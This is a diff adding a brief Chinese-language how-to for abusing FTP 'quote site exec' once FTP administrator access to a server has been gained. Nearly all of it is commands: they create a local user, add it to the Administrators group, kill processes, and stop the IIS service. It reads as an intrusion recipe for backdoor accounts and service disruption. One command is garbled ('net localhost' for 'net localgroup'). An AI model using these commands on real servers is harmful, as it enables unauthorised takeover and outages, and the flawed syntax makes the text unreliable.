@@ -1,0 +1,11 @@
+在获得服务器FTP管理员后可以用quote site exec命令来添加系统管理员,cmd下操作方法如下:quote site exec net user 用户名 密码 /add 添加一个用户
+
+quote site exec net localhost administrators 用户名 /add 把用户添加到系统管理员组
+
+quote site exec tskill PID 在 Windows 2003 中通过 PID 关闭进程
+
+quote site exec tskill notepad 在 Windows 2003 中通过名称关闭同类的进程
+
+quote site exec net stop iisadmin 停止 iis 服务
+
+quote site exec net start iisadmin 启动 iis 服务
